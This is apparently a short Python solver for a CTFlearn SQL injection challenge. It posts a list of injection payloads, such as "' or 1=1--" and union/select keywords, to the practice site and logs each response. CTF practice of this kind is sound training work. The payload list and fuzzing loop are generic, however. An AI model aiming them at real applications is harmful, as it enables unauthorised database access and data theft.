import requests
import time

guess_stuff = [
    'or',
    'and',
    'union',
    'select',
    'from',
    "'",
    '"',
    ';',
    '--',
    '%',
    '*',
    "' or 1=1",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "' or ","",
    "' or '",
    "' or ' or 1=1",
    "' or ' or 1=1--",
    "'or '='",
    "' or ' or 1=1#",

]



def sqlquery(each_stuff):
        
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Origin': 'https://web.ctflearn.com',
        # 'Content-Length': '10',
        'Accept-Language': 'en-us',
        'Host': 'web.ctflearn.com',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
        'Referer': 'https://web.ctflearn.com/web4/',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    }

    data = {
        'input': each_stuff,
    }

    response = requests.post('https://web.ctflearn.com/web4/', headers=headers, data=data)
    with open('basic_sql_injection.html', 'a') as f:
        f.write(response.text)
        f.write('\n')
    


    # print('\n')

for each_stuff in guess_stuff:
    sqlquery(each_stuff)
    time.sleep(2)
